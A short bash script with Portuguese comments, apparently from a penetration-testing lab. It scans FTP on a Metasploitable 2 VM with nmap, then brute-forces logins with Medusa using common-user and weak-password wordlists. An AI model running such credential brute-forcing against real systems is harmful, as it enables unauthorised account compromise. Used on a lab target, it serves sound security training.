#!/bin/bash
# run_ftp_attack.sh: Executa o ataque de Força Bruta FTP no Metasploitable 2 (192.168.56.20)

TARGET_IP="192.168.56.20"
USER_LIST="../wordlists/usuarios_comuns.txt"
PASS_LIST="../wordlists/senhas_fracas.txt"

echo "--- 1. Verificando Serviço FTP (Nmap) ---"
nmap -p 21 $TARGET_IP

echo -e "\n--- 2. Executando Ataque de Força Bruta FTP com Medusa ---"
# O -n 50 (threads) acelera o processo.
medusa -H $TARGET_IP -U $USER_LIST -P $PASS_LIST -M ftp -n 50

echo -e "\n--- FIM DO TESTE FTP ---"
echo "Capture a tela do resultado para a pasta images/"